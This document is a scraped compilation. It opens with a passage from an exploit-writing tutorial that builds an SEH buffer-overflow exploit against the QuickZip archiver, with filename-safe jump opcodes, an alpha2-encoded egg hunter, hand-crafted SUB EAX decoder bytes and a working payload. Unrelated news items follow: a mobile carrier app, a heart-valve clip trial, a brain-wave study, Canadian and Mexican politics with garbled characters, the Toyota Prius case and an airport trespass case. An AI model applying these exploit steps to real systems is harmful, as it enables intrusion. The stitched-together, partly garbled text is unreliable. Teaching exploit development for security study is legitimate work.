But I do n’t really care about that right now .
What happened to the nseh and seh addresses ?
They got mangled .
But why did they get mangled ?
Try to figure that out first , and then continue reading .
The payload we are using will be used to construct a filename inside the zip file .
So if we are dealing with a filename , then it is very likely that we can only use characters that would be valid in a filename .
That ’s a character set limitation .
After all , filenames only support some ascii characters ( numbers , ascii characters … and some other characters … stuff that is accepted as a valid character in a filename ) .
So that explains why our nseh and seh content got messed up .
The null byte in the SE Handler address is still there , so that one did not get mangled .
The D’s ( that were written in the payload after overwriting the SEH structure ) are gone …
But that ’s ok … it ’s what you had expected , right ?
As long as we can get an access violation to trigger the SE Handler , we should be fine .
Open ppr.txt again and look for other ppr pointers that only contain hex values that would correspond with what I ’ll call “ filename compatible characters ” .
Take for example 0x0040322B .
0x40 = @ , 0x32 = 2 , 0x2B = + => all characters that are valid in a filename .
Put this address in SE Handler , and let ’s set nSEH back to BBBB for now .
We just want to know if our ppr address works .
Change the 2 values in the perl script , create a new zip file , and trigger the crash again
my $ nseh = " BBBB " ; # SE Handler : ppr from quickzip.exe : my $ seh=pack ( ' V',0x0040322B ) ;
Ah yes .
SE Handler looks fine now , so hurdle 1 is taken .
But I ’ll need to keep this “ little character set limitation ” in mind .
It may cause some other issues along the way .
Let ’s verify that the 4 bytes ( BBBB ) at nseh are still ok .
First , set a breakpoint at the pointer to pop pop ret :
bp 0x0040322B
Pass the exception to the application ( Shift F9 ) .
This should invoke the handler and the breakpoint should be hit .
If all goes well , we should see our pop pop ret instruction
Press F7 to step through the pop pop ret instructions , and verify that , when RET is executed , we land at our 4 B’s :
Nice .
This is what we have so far :
297 A’s + nseh ( BBBB here ) + seh .
Again , there ’s no trace of the D’s that were put in the payload after nseh and seh , but that ’s ok for now .
Typically , when we encounter a situation similar to this one , we probably would want to do something like this :
nops + shellcode + nops + “ far_jump_back_to_shellcode ” + nseh ( short jump back to “ far_jump_back_to_shellcode ” ) + seh + junk
The question is : how can we do the short jump back if the jump back opcode should be “ filename - compatible too ” ?
( limited character set ) .
Jumping back ?
Remember when we used xebxf0xffxff as jump back code ?…
As you could see on the stack , it got converted / corrupted / whatever you want to call it , into x64x3dxA0xA0
How can we make the jump if the opcode to make the jump gets mangled ?
=>
This is a good time to take one step back => and think about it :
What would you would do ?
This is what I did .
There are other ways to jump …
You could try to use a “ conditional jump ” for example .
You can read about it at the end of this post .
Conditional jumps are jumps that are taken ( or not taken ) based on a condition .
Deciding whether a jump is made or not , could be based upon the value of a register ( say for example jump if eax or ecx are zero or not ) , or could be based upon the value of a flag and so on .
If you look at the list with conditional jump opcodes , we can find some instructions that use opcodes within the range of our character set : 72 , 73 , 74 , 75 and so on .
Most ( if not all ) of the conditional jumps in the list at the end of this page ( the list of opcodes that are “ filename - compatible ” are mostly making a jump based on flag status )
So we need to know the content of the flags right after the pop pop ret was executed .
( set a breakpoint at the pop pop ret address , and then step through until right after the ret instruction is executed ) .
When you look at the flags , you get this :
EAX 7C9032A8 ntdll.7C9032A8 ECX 0040322B QuickZip.0040322B EDX
0012F698 EBX 00000000 ESP 0012F5BC EBP 0012F5D0 ESI 00000000 EDI 00000000 EIP 0012FBFC C 0 ES 0023 32bit 0 ( FFFFFFFF ) P 1 CS 001B 32bit 0 ( FFFFFFFF ) A 0 SS 0023 32bit 0 ( FFFFFFFF ) Z 1 DS 0023 32bit 0 ( FFFFFFFF ) S 0 FS 003B 32bit 7FFDE000 ( FFF ) T 0 GS 0000 NULL D 0 O 0 LastErr ERROR_FILENAME_EXCED_RANGE

CF = 0 , PF = 1 , AF = 0 , ZF = 1 and so on .
So based on the state of the flags , opcodes 0x73 ( jump if ZF = 1 ) or 0x74 ( jump if ZF = 1 ) would be good options .
Obviously , the jump opcode needs an offset ….
an offset that would make a jump back .
The offset we tried to use earlier was 0xf0 .
After it was processed by the application , it became 3 D .. and that ’s not a jump back ..
So we can not do that .
=>
This is a good time to take one step back => and think about it :
What would you would do ?
This is what I did .
I tried .
I just started at 0xfe and went down ( 0xfd , 0xfc , 0xfa and so on ) .
The initial plan was to to see if I could find a relation between the original value and the value it got converted into .
I could not find a direct relation , but I discovered that bytes such as 0xf1 get converted into bytes that would allow me to jump back .
0xf1 , for example , gets converted to 0xB1 , and that ’s a jump back .
In fact , it ’s a jump back of 0x4D bytes ( 77 bytes ) .
So if we put 0x73 0xf9 0xff 0xff at nseh , we will be able to perform a backward jump .
That ’s ok , but it may be not far enough for shellcode , and it may be too far to place another far jump back , because we would loose 77 bytes ( and we only have like 297 bytes to start with ) .
On the other hand , we can already run some nice code with 77 bytes or with 220 bytes .
So we have some options .
At the same time , it brings up the question about shellcode and size .
77 bytes , 220 bytes , 297 bytes … that ’s great … but if you want to run some decent shellcode it will not be enough .
Furthermore , we still need to think about the character set limitation .
Ok , we can jump back .
What ’s next ?
We basically have 3 remaining issues :
we need to get shellcode that will survive the character set limitation
we need to be able to find enough space to host the shellcode , or find shellcode that would be small enough and still do something useful
we need to be able to jump to the shellcode
=>
This is a good time to take one step back => and think about it :
What would you would do ?
What was your first thought when you read the first issue ?
“ get shellcode that will be “ filename - compatible ” - proof ? ”
You thought about encoding it , right ?
You assumed that the shellcode needs to be encoded to survive the conversion … but perhaps you forgot two essentials things :
the available space ( 297 bytes ) would not be big enough to hold decent code – and if you will need to encode the shellcode , it would only grow bigger .
you are not even sure if the memory location where these 297 bytes are hosted , is the only place where you can put your shellcode .
After all , we have written a large amount of D’s into the zip file .
Ok , you may not see them on the stack ( when the overflow occurs ) , but that does not mean it ’s gone .
Do n’t just assume things .
Test .
Try .
Try harder if you do n’t succeed straight away
Where can we put our shellcode ?
And can we use shellcode > 297 bytes ?
So let ’s find out if we have other options to put our shellcode .
Instead of writing D’s after seh , we ’ll use a Metasploit pattern .
We can use the 4064 byte metasploit pattern from earlier – we just have to truncate it so the total size of the payload would not be larger .
Code :
( paste your metasploit pattern in the $ mspattern variable )

Create zip , trigger crash , get pop pop ret to execute , and you should land at the jump back
Now stop stepping through and run the following command in Immunity :
!pvefindaddr findmsp
This will search all process memory for metasploit pattern .
So , in other words , if it can find the metasploit pattern , it means that it got loaded by quickzip and that also means that we may be able to take advantage of that .
Result :
Cool – we can find the metasploit pattern in memory ( heap ) .
So that means that we are not limited to the 297 bytes at the beginning of the payload .
If that happens , we may have to use an egg hunter to get to the shellcode location , but we ’ll get to that in a minute .
First , we need to check if that location is also subject to our character set limitation .
The metasploit pattern uses filename - compatible characters already , so we need something else to test .
We can do this by generating some real shellcode , writing it into the zip file ( instead of the metasploit pattern ) , and writing it to a separate file at the same time .
That setup will allow us to use another feature of the pvefindaddr plugin .
Generate some shellcode ( and do some basic alphanum encoding on it , just to be sure ) :

Tip : want to try the messagebox metasploit payload yourself ?
You can get a copy of this module here ( link can be found at end of page )
Change the perl code to write the shellcode to the buffer after overwriting SE , and add some junk before and after ( just to be sure ) .
Write the shellcode to a separate file too .
Code will look like this :

Create zip file again , trigger crash , set breakpoint at pop pop ret , step through ( to get pop pop ret to execute ) , and then stop right before the jump back is made ( at nseh ) .
Now run the following command :
!pvefindaddr compare c:shellcode.bin
This will do 2 things :
it will locate all instances of the shellcode in process memory ( stack + heap )
it will compare the instances in memory with the original shellcode ( the one that was written to shellcode . bin in our example ) and see if there are any differences .
Based on our test with the metasploit pattern , we should find 2 instances in memory .
And if some kind of characterset conversion / corruption took place , then you will see that too .
Output :
Ok – that ’s looks promising !
Our shellcode can be found in memory ( even though it was positioned in our buffer after a null byte ) , and it did not get corrupted .
Furthermore , this code was 667 bytes , so we are not limited to 297 bytes anymore either .
This means that – if we can jump to it ( or get an egg hunter find it ) , we win .
Tip : the output of the compare function is also written to a file compare .
txt ( in the Immunity Debugger program folder )
Let ’s assume that we will use an egg hunter .
We have 297 bytes at our disposal ( which should be enough for hosting and running the egg hunter ) , so it should not take us more than a few minutes to get this one to run , right ?
=>
This is a good time to take one step back => and think about it : Did I miss anything here ?
Ah yes … before we continue … damn … we wo n’t be able to use a regular egg hunter because it contains some non-filename - compatible characters .
Sounds like we ’ll need to do encode the hunter too …
The hunter
Finding an egg hunter that will do the job is trivial .
We ’ll use the one that uses NtAccessCheckAndAuditAlarm .
As stated earlier , we ’ll probably need to encode the egg hunter .
There are a couple of ways to do that : use metasploit , or use skylined ’s alpha2 / alpha3 encoders .
But which one should we use ?
=>
This is a good time to take one step back => and think about it :
Which one will work , which one will not work ?
By default , the metasploit encoder will produce code that includes a GetPC routine .
The bytes used in that routine are most likely not going to be “ filename - compatible ” .
So we can not really use that technique .
Skylined ’s alpha2 encoder uses a different technique .
It will assume that the baseaddress of the decoder ( so basically the memory address where the decoder is located in memory ) is in a given register , and the decoder will just take that value to determine it ’s own address ( GetPC ) .
The advantage of this is that the encoded egg hunter will be based on filename - compatible ascii characters only .
Let ’s say we want to encode the egg hunter , and use eax as baseaddress , then this is how you need to encode the hunter and what the output will look like .
first write the egg hunter ( using w00t as tag ) to a file called egghunter .bin , then run the alpha2 command
root@bt4:/pentest/exploits/alpha2# ./alpha2 eax -- uppercase > egghunter.bin PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISVK
1YZKODO1R0RRJ5RV88MFN7LS50ZCDJOX8BWP0VPCDLKZZNOSEZJNOSEKWKOM7A
This looks fine in terms of charset compatibility .
So we should now put this egg hunter in the payload ( somewhere in the first 297 bytes ) , and then see if we can use the jump back to eventually jump to the beginning of this encoded egg hunter and let it run .
Basically , if we put a “ far ” jump back before nseh , and we can use the short jump back at nseh , then we may be able to jump to the beginning of the egg hunter , right ?
=>
This is a good time to take one step back => and think about it :
Is it as simple as writing opcode for far jump back ?
No , unfortunately not .
There are 2 things you need to keep in mind here
the ( far ) jump back code would need to be written in filename - compatible opcode too
we need to set a register ( we used eax as basereg , so we must craft the value in eax ) to the memory location where the egg hunter is located , in order for the decoder to work , and that code will need to be written in filename - compatible opcode as well .
It almost looks like we are running in circles here .
In order for encoded egg hunter to run , we need to write some code .
But that code may need to be encoded so it would be filename - compatible .
In order for that encoded code to run , you need to write some code … etc etc
How can we solve this ?
=>
This is a good time to take one step back => and think about it :
What would you do ?
Give up ?
Or Try Harder ?
Run hunter , run !
This is what I did :
Given the fact that we need to put the address ( that points at the beginning of the encoded egghunter ) in a certain register , I decided to combine the actions required to crafting this value , and then doing a far jump back .
Basically , what I need to do is set the value in the register and just jump to the register .
So , if we put the egg hunter at the begin of the payload , then our payload looks like this :
[ egghunter ] + [ A’s ] + [ nseh ] + [ seh ] + [ egg_tag ] + [ shellcode ] + fill_up_to_4064 bytes
So , when the jump back at nseh is executed , we would land at the end of the A ’s before nseh .
In that area , we need to write the code to modify the register value ( make it point to the begin of the egghunter ) and then jump to that register .
First , we need to determine how to get the required value into the register .
The idea is to use a value in a register or on the stack , add or subtract some bytes , and then jump to it .
Let ’s try .
Use this code to generate a zip file that is based on the structure above :

Trigger the overflow , let pop pop ret kick in , and stop right after the jump back ( at nseh ) is made .
Look at the registers :
Try to locate the begin of the egghunter too ( just scroll up in the CPU view until you reach the begin of the hunter – or search for it :
Ok , the first byte of the egghunter could be found at 0x0012FAD3 :
How can we now jump to that address in a reliable way ?
Well , we can just put this address in a register and jump to that register …
Hardcoding addresses is a bad idea .
It would be better to take the existing value of a register , add or sub some bytes ( so basically use a relative offset ) to that register and then make the jump .
As you can see , we have a couple of options .
Look back at the registers .
EDX ( 0x0012F698 ) contains an address that sits below the address where the egg hunter is located .
So I will use EDX , modify the value ( basically add 0x43B bytes to EDX to go from it ’s current value ( 0x0012F698 ) to the begin of the egg hunter ( 0x0012FAD3 ) .
Then I need to jump to edx .
When we encoded the egg hunter earlier , we used eax as base address .
That means that after crafting the value in edx , I either have to put the address in eax prior to making the jump ( because eax needs to point at the baseaddress of the egg hunter too ) , or I would have to re-encode the egg hunter so it would use edx as basereg .
Let ’s try to keep things simple .
We ’ll just put edx in eax so we do n’t have to do the encoding again .
So – the plan is to do this :
add edx,0x43B
push edx
pop eax
jmp edx
The opcodes for these instructions can be found using pvefindaddr :
! pvefindaddr assemble add edx,0x43B # push edx #pop eax#jmp edx
Output :
0BADF00D Opcode results : 0BADF00D
----------------
0BADF00D add edx,0x43B = x81xc2x3Bx04x00x00 0BADF00D push edx = x52 0BADF00D pop eax = x58 0BADF00D jmp edx = xffxe2
Still with me ?
=>
This is a good time to take one step back => and think about it :
Are we doing the right thing here ?
Ah yes – of course we are doing the right thing .
But there ’s an issue again .
The opcode bytes are not filename - compatible , they contain null bytes … in short , the code wo n’t work .
What are your options ?
If the opcode is not filename - compatible , perhaps you can encode it , right ?
Sorry hunter – do n’t start running yet …
I ’ll be with you in a minute
=>
This is a good time to take one step back => and think about it :
What would you do to get around this ?
Seriously .
Did you really consider encoding the code with metasploit or alpha2 ?
Think again .
You would end up in a circle again .
Using alpha2 or metasploit really is not an option here .
There is only one good solution for this , and that ’s writing your own hand - crafted custom decoder .
A decoder that would be filename compatible , and that does not need to find it ’s baseaddress in a register or using GetPC code …
Time to get your hands dirty .
A possible technique to build your own custom decoder is by using the algorithm used by muts , and also explained here ( see “ hand - crafting the encoder ” ) .
This decoder would reproduce the original opcode bytes ( per 4 bytes ) on the stack , based on mathematical operations .
Basically , register eax would be set to zero , and then 3 values would be subtracted , reproducing the original 4 bytes of opcode .
The technique is based on eax , because the SUB instruction on eax is based on a filename - compatible opcode ( unlike the same SUB operation on other registers ) .
Eax … wait a minute .
We are already using eax as baseaddress for our encoded egg hunter .
So if we are crafting a value in eax , and we are also using eax for the decoder , then it looks like we need to use another register as base register for the encoded egghunter .
Well , since we we are already using edx to craft the value , perhaps we should just re-encode the egg hunter using edx as basereg , and then we can leave out the “ push edx ” and “ pop eax ” instructions from our “ alignment ” code at the same time .
That would make our alignment code 2 bytes smaller ( now 8 bytes in total )
Re-encode the egg hunter with EDX .
The output should look something like this :
my $ egghunter = " JJJJJJJJJJJRYVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8A " . " CJJIU6MQ9ZKO4OG2V2SZ4BV8HMFNGL5UQJD4ZONXRWP0P02TLKJZNOT5ZJNO3EKWKOM7A " ;
The new modified “ alignment ” opcode looks like this :
0x81 0xc2 0x3B 0x04 0x00 0x00 0xff 0xe2 :
add edx,0x43B
jmp edx
Ok , now it ’s time to build our custom decoder .
Hmmm hold on hunter – this may take more than a minute
We have to group the instructions into dwords ( 4bytes ) , and start reproducing the last 4 bytes first .
The reproduced bytes need to be pushed to the stack .
When everything is reproduced , we must jump to / execute the reproduced code .
Simple as that .
This is how it works :
Start with the last 4 bytes of the code and reverse them .
Then calculate the 2’s complement for that new 4 byte value .
Example :
Original code : 0x00 0x00 0xff 0xe2
Reversed : 0xe2 0xff 0x00 0x00
2 ’s complement ( Windows calc – Hex – dword – type “ 0 – E2FF0000 ” ) : 1D010000
Now find 3 values that will , if you add ( sum ) them again , would lead back to 1D010000 .
The caveat is that these 3 values must be using filename - compatible characters only .
In this case , the following 3 values would do the trick : 5F555555 , 5F555555 and 5E565556 .
If you sum these 3 values , you end up at 1D010000 ( well , in fact you end up at 11D010000 , but the first 1 will be ignored )
Quick tip on calculating these values :
start with the last byte first and divide it by 3 .
If the result of the division is too small and / or not filename - compatible , then just prepend the byte with 1 and divide by 3 again .
( You will have to take this overflow into account for the next bytes ) .
Example : 00 / 3 = 0 ( => not compatible ) .
Prepend 00 with 1 = 100 .
Divide by 3 = 55 . 55 + 55 + 55 = FF , so in order to get to 00 , you need to add 1 to one of the values => 55 + 55 + 56 .
Move on to the next byte ( second last byte ) in the value and do the same math .
We already know that 55+55+56 = 00 .
But since the previous calculation produced an overflow , you will have to compensate for this “ 1 ” overflow .
( So in this case , you ’ll have 55+55+55 ( +1 from the overflow ) = 00 )
And so on …
So , in order to recombine the original 4 bytes , you have to do this :
– set eax to zero : you can use this code to do it
" x25x4Ax4Dx4Ex55 " .
" x25x35x32x31x2A " .
– reproduce the bytes by subtracting the 3 values from eax
" x2dx55x55x55x5 F " .
" x2dx55x55x55x5 F " . " x2dx56x55x56x5E " .
as you can see , the opcode to sub eax is 2D – which is a valid filename - compatible character .
You need 3 lines of code , and do n’t forget to put the 4 bytes in reverse order .
So subtracting 5F555555 from eax would be 2D 55 55 55 5 F )
– push the reproduced 4 bytes to the stack : push eax
" x50 "
Basically , you need to build a block of code for each 4 bytes .
Each block of code consists of zero eax , then doing the sub operations on eax , and then pushing the result to the stack .
These blocks must be placed in the correct order .
You have to reproduce the last 4 bytes first and then work your way up to the first bytes .
The code to reproduce 0x81 0xc2 0x3B 0x04 0x00 0x00 0xff 0xe2 on the stack looks like this :
my $ buildjmp = " x25x4Ax4Dx4Ex55 " .
" x25x35x32x31x2A " .
" x2dx55x55x55x5 F " . " x2dx55x55x55x5 F " . " x2dx56x55x56x5E " . " x50 " .
" x25x4Ax4Dx4Ex55 " .
" x25x35x32x31x2A " .
" x2dx2Ax69x41x54 " .
" x2dx2Ax69x41x54 " .
" x2dx2Bx6Bx41x53 " . " x50 " ;
If we place this code before overwriting the SE structure , then the jump back at nseh will get this code to execute .

When the custom decoder has been executed , the original 8 bytes of code will be reproduced on the stack :
How can we now execute this reproduce code on the stack ?
Our reproduced code is available at ESP .
So we need to jmp esp ?
Jump ESP
What filename - compatible opcode can we use to jump to ESP and execute this code ?
=>
This is a good time to take one step back => and think about it :
What are our options here ?
To be honest , there are no options really .
Adding some jumpcode ( code that would do jump esp ) after the custom decoder is not an option .
The opcode for jmp esp , for example , is 0xff 0xe4 .
Both bytes are not filename - compatible .
We have to look at it from a different angle .
We do n’t really want to jump to esp .
All we want is execute the code .
That is our goal .
Making a jump to esp is just a vehicle to getting the code executed .
=>
This is a good time to take one step back => and think about it :
What would you do next ?
The answer is simple : instead of jumping to the code on the stack , we should reproduce the code in a location so it would get executed automatically , after the decoder has finished .
So we should try to write the reproduced code right after the custom decoder .
When the decoder finishes , it would just start executing the reproduce code …
Each custom decoder code block pushes 4 bytes to the stack .
So it puts 4 bytes at the memory location where ESP points at .
That means that , if we can modify ESP before the custom decoder runs , and make it point to a location after the custom decoder itself , then it might work .
Of course , the opcode instructions to modify ESP needs to be filename - compatible too , so we are limited to just a few instructions .
Load the zip file again in the debugger , and look at the registers and the stack just before the custom decoder runs .
We need to find a location that points below the decoder .
In my example , the decoder starts at 0x0012FBC8 and ends at 0x0012FBFB .
None of the registers points to a location more or less directly below the end of the decoder .
But on the stack , we see this :
The 5th address from the top of the stack points at 0x0012FBFC .
And that is one byte below the custom decoder .
We are going to push 8 bytes , so one byte is not enough … but luckily we can change the location of our custom decoder in the payload and leave more room ( 8 bytes or more ) between the end of the decoder and this address .
How can we make ESP point to this location before the custom decoder runs ?
Easy .
Do some pops ( or just a popad ) , and move the address into esp .
popad ( 0x61 ) will put this address into ebx .
Then all you need to do is push ebx ( opcode 0x53 ) , and pop esp ( opcode 0x5 c ) .
Note : 0x5C is a backslash .
A backslash is not exactly a filename - compatible character , but we get lucky again .
If you put a backslash in the filename inside the zip , then everything before the backslash will be displayed as a folder name , and the exploit will still work .
Modify the exploit code again and prepend the custom decoder with these 3 instructions + insert at least 8 bytes between the end of the custom decoder and the location where nseh gets overwritten .

Create the zip and run things through the debugger again .
Instead of just a filename , we now see a folder in quickzip , and it has a file in it ( this is the impact of the 0x5C character )
SEH still gets overwritten , ppr gets executed , and the jump back is made .
You now land into the A’s that sit in front of the custom decoder .
Conveniently the A’s act as some kind of NOP ( 0x41 = inc ecx )
This decoder now starts with our 3 stack alignment instructions :
Right after these 3 instructions ( so just before the first AND EAX operation is executed ) , ESP points at 0x0012FBFC , which is what we had expected .
You can also see the 8 A’s ( 0x41 ) which we have placed between the custom decoder and nseh ( which – incidentally – sits at 0x0012 FBFC ) .
Step through until you push the first 4 bytes to the stack ( so step through until after the first PUSH EAX ) .
When you now look at the instructions , you can see that the last 4 bytes of our jumpcode have been reproduced .
Continue to step through until the next push eax is executed ( at 0x0012 FBF3 ) .
Right after this push , the next 4 bytes ( in fact , the first 4 bytes ) are reproduced too , completing the entire jumpcode .
Since this jumpcode is now located just below the custom decoder , this code will get executed automatically .
Nice – so we win ?
Well , not yet .
When the jmp esp is made , you will notice that EDX does not point to the begin of the egg hunter anymore .
Huh ?
Did we make a mistake when calculating the offset earlier ?
No , we did n’t .
Because we used a popad instruction , we changed edx too .
And our code was specifically built to add 0x43B to the original value of EDX .
Look back – when the popad instruction is executed , EDX is changed from 0x0012F689 to 0x0012F680
There are 2 ways to fix this :
change the decoder so it would add the offset based on 0x0012F680 .
Can be done , just do the math again and replace the changed bytes in the SUB EAX instructions .
do n’t use popad , but use a series of pop instructions to get the desired value into ebx anyway ( without touching the other registers ) .
Opcode for pop ebx is 0x5 b ( which referes to the [ character … and that is not a valid filename - compatible character .
pop eax = 58 – so that one might work .
Replace the popad with 5 pop eax instructions .
Finish the stack alignment code with push eax ( 0x50 ) and pop esp ( 0x5 c ) to get ESP to point at the desired location .
If you get this code to work , and to make edx point exactly at the start location of the egghunter ( you can still reposition the egg hunter a bit in the payload string if that would be required ) , then you should have a working exploit .
Run hunter , run !!
our messagebox popped up … => owned !
What is the impact if you decided to use a pop pop ret address from an OS dll ?
Hah –
That ’s a good exercise .
Try it .
I may post the details / solution about this scenario in a week or so …
In the meantime , give it your best shot and let me know if you figured it out .
If you have questions … look here
Good luck

Poor AT&T , it must be tired of being tied to the whipping post and constantly flogged in the media for its abysmal network performance .
To address its network woes , AT&T has released a new iPhone application called Mark the Spot to help AT&T customers report any failures with their service .
The app uses geo-location to pinpoint the handset ’s location and asks the user to identify the type of problem which they are reporting .
Based upon the number of “ AT&T network down ” tips that we receive , we have a feeling that AT&T is going to be flooded with submissions .
But to be completely fair , this is a pretty brilliant tool and should be available on practically any carrier .
It can help push fixes to constantly troubled locations , improve dead zones , and more .
Thanks ,

ATLANTA — Leaky heart valves can be fixed without major surgery by guiding a tiny , clothespin - like clip into place from an incision in a vein in the groin , doctors said Sunday .
The clip was designed to fix leaky mitral valves , diagnosed in 250,000 people in the USA each year .
Doctors say the new research heralds a new era , one in which major heart defects can be repaired without slicing open the chest to reach the heart .
" This is a huge advance , " says study leader Ted Feldman of NorthShore University Health System in Evanston , Ill .
" We 've had patients who can't feed themselves because they 're exhausted just lifting a fork .
A few days later , they 're walking around . "
Leaky mitral valves sap the efficiency of the heart , overloading it with blood and preventing it from pumping enough to meet the body 's needs .
Over time , the chronic overload expands the heart , weakening it and causing life - threatening heart failure .
In the past , Feldman says , doctors have been able to offer patients only two options for treatment .
If the condition is severe — and the patient is n't too old or too sick to tolerate surgery — doctors will slice into the chest , split the breastbone and stitch up the valve or replace it with a mechanical device .
As many as 100,000 patients now have mitral valve surgery in the USA each year , Feldman says .
When patients can't tolerate surgery , doctors prescribe heart - failure medications , he says .
" What we have now is a third option , " Feldman said at the annual meeting of the American College of Cardiology .
The device , called MitraClip by its maker , Abbott , is available in Europe and is awaiting Food and Drug Administration approval .
Feldman says the clip is guided into the heart using a similar technique used in angioplasty patients to open clogged arteries .
Instead of inflating a balloon inside a blood vessel , doctors guide the clip into the heart , where it secures the valve 's leaflets .
When the clip is in place , it ensures that the heart can pump blood only in one direction , out through the aorta to the rest of the body .
The study was designed to compare the MitraClip to surgery in 279 patients with moderate to severe mitral leakage .
The clip was installed in 184 patients ; 95 patients had surgery .
Researchers analyzed data from 137 device patients and 79 who had surgery .
One year later , 72 % of the clip patients and 88 % of the surgery patients were alive , did not need additional valve surgery and no longer had serious leakage , which demonstrated that the clip was statistically not inferior to surgery .
Only 9.6 % of patients in the device group had complications within 30 days ; 12 had enough blood loss to warrant transfusion .
In contrast , 57 % of surgery patients had complications , including two deaths , two strokes and four patients who needed emergency surgery , Feldman says .
Donald Glower , a Duke University surgeon who helped carry out the trial , says the clip probably will be especially helpful for patients too frail to have surgery ; others , whose valves are too far gone , still need surgery .
" It will take many years for this to become a mature technology , " he says , " so we 'll know who should get it and who should n't . "
They say there 's only one chance to make a first impression , but what makes that memory last ?
Research scientists at Cedars - Sinai Medical Center and the California Institute of Technology suggest in an article in the March 24 , 2010 , journal Nature ( online ) that when memory - related neurons in the brain fire in sync with certain brain waves , the resulting image recognition and memories are stronger than if this synchronization does not occur .
Synchronization is influenced by " theta waves , " which are associated with relaxation , daydreaming and drowsiness , but also with learning and memory formation .
While it has long been understood that a relaxed mind is one that is ready to receive new information , this study pinpoints a mechanism by which this state of mind allows neurons to work together to improve memory retention .
Further exploration of these events could have implications for developing new therapies to treat learning disabilities and some types of dementia , according to the authors .
Brain waves oscillate , with rhythmic highs and lows , and can be measured with electroencephalograms , which use electrodes to record electrical activity .
One measure of waves is the frequency of peaks per second , but two waves of the same frequency may not be locked in " phase . "
Like the sound waves of two musical instruments that are slightly out of tune , two out - of - phase brain waves of the same frequency would be similar but slightly out of sync .
" Theta oscillations are known to be involved in memory formation , and previous studies have identified correlations between memory strength and the activity of certain neurons , but the relationships between these events have not been understood .
Our research shows that when memory - related neurons are well coordinated to theta waves during the learning process , memories are stronger , " said Adam N. Mamelak , M.D. , a neurosurgeon at Cedars - Sinai Medical Center whose areas of expertise include treatment of seizure disorders .
Mamelak is one of the article 's senior authors , with Erin M. Schuman , Ph.D. , professor of biology at the California Institute of Technology .
" We have yet to discover all factors that influence theta oscillations and the coordination of spike timing , but this study establishes a direct relationship between events at the circuit level of the brain -- individual neuron spike timing relative to the local brain wave environment -- and their effects on human behavior , " said Ueli Rutishauser , Ph.D. , a postdoctoral scholar at the California Institute of Technology , and the article 's first author .
He noted that the study also found that while the predictability of memory strength was determined by spike timing relative to theta oscillations , it was not influenced by other related factors , such as the neuron firing rate or the amplitude of the theta oscillations .
Subjects in the study were presented with novel stimuli that they had not previously seen .
These were in the form of 100 photographs of a wide range of objects , each viewed for one second .
Fifteen to 30 minutes later , they were shown a set of 100 photos , 50 that were new and 50 that had been in the first set .
They were asked to recall which ones they had seen before and to estimate how confident they were in their answers .
While these activities were in progress , the researchers recorded the activity of single neurons -- 296 in all -- and the " background " local electrical signals in regions of the brain where memories are encoded ( the hippocampus and the amygdala ) .
According to the results , image recognition was stronger when learning occurred while neuronal spikes were in sync with local theta waves .
Most studies of theta waves have been conducted in rats , with only a few studies in humans , in part because EEG electrodes need to be placed directly on the brain 's surface for highly precise measurements .
This study was conducted with eight volunteers who suffer from epilepsy and were undergoing intracranial EEGs .
These are often used to pinpoint the source of epileptic seizure activity .
The authors note that steps were taken to ensure that the patients ' underlying medical condition did not affect the outcome of the study .
Brain wave frequency is measured per second and quantified in hertz ( Hz ) .
A wave that cycles 10 times per second is considered a 10 Hz wave .
Most brain waves recorded in humans range up to about 40 Hz , although they also go much higher .
Theta waves oscillate toward the lower end of the scale , in about the four Hz to seven Hz range .
Neurosurgeon Ian B. Ross , M.D. , and the Huntington Memorial Hospital Epilepsy & Brain Mapping Unit also participated in this study .
Funding for the study was provided by the Gordon and Betty Moore Foundation , the William T. Gimbel Discovery Fund , and the Howard Hughes Medical Institute .
Many people wonder , how did Russia look like before the Communists takeover in 1917 .
It ’s not well known that in that times Russia was a normal capitalistic state and stayed in good relations with other Western states .
Here is a big hundred photo set of Russia at that times , in color .
It seems it was a pretty nice place to live .
news Jack Layton Wants To Make Sure You See Him Celebrating That Goal !
Jack Layton spent the Olympic men ’s gold medal hockey game ( we won ! ) at Wayne Gretzky ’s Restaurant , right in front of the bar , and right in front of CTV ’s cameras trained on the crowd there .
Towards the end of the second intermission , just before going to commercial , CTV showed reactions to Canada ’s second goal from “ across the country . ”
And then , after a cut from a Nova Scotia crowd ’s reaction to the crowd at Gretzky ’s : magic .
With wife Olivia Chow nearby , Layton celebrates the goal for just a second , before turning from the TV that ’s playing the game to face the CTV camera instead , trying to move his body out from behind those around him , and then — when a woman ’s arm raised in ecstatic celebration blocks his face from the shot — Layton takes his outstretched hand and , still smiling , grabs her arm and forces it down and out of the way as the shot fades out .

El coordinador del PRI en el Senado , Manlio Fabio Beltrones , afirm � que si el secretario de Gobernaci�n , Fernando G�mez Mont , renunci� al PAN para ejercer sus funciones con " absoluta imparcialidad y apego a ley " , tambi�n debe renunciar a su militancia el presidente Felipe Calder�n .
En breve entrevista , Beltrones coment � que si es uno de los argumentos que consider � G�mez Mont para distanciarse del blaquiazul , debe hacer lo mismo el Ejecutivo para que adquiera mayor capacidad de maniobra que tanto requiere .
" G�mez Mont es un hombre congruente , un hombre de ideas que debe tener sus razones bien documentadas para renunciar a su militancia en el PAN .
" Yo espero que en el futuro , sea �l quien aclare cu�les fueron sus razones para separarse del cargo " , apunt� el senador del PRI .
Beltrones consider� que el titular de la Segob no debe actuar como en su momento sucedi� con el l�der doctrinario del PAN , Carlos Castillo Peraza , " a lo que pueden ser sus convicciones ideol�gicas que est�n dentro de ese partido pol�tico " .

Toyota Motor Corp. said Monday it believes the driver of a Prius involved in a high - speed incident on a California highway repeatedly pressed the brake and accelerator , apparently defeating a system that can prevent unintended acceleration .
The driver , James Sikes , has said he applied heavy pressure to the brake pedal while the car accelerated on its own last week near San Diego .
Toyota said the condition of the car 's brakes and information captured by the vehicle 's diagnostic system do n't support that version of events — even ...
" I do not agree with Geert Wilders that the Koran should be banned – even in Holland where Mein Kampf is banned .
I do n't want it banned but discussed and specifically as to whether it may promote or justify – or has promoted or justified – violence .
I am therefore promoting freedom of speech , " said Lord Pearson .
New York ( CNN ) -- A New Jersey man who breached airport security to give his girlfriend a kiss , causing scores of flight delays , pleaded guilty Tuesday to defiant trespass , his lawyer said .
Haisong Jiang , 28 , pleaded guilty to a charge that is a " petty disorderly persons offense ... it 's below a crime , it 's not even considered a crime in New Jersey , " his lawyer , Eric B. Bruce said .
Jiang apologized .
" I made big mistake , and I also learned a big lesson in my life , " he told reporters after the court appearance .
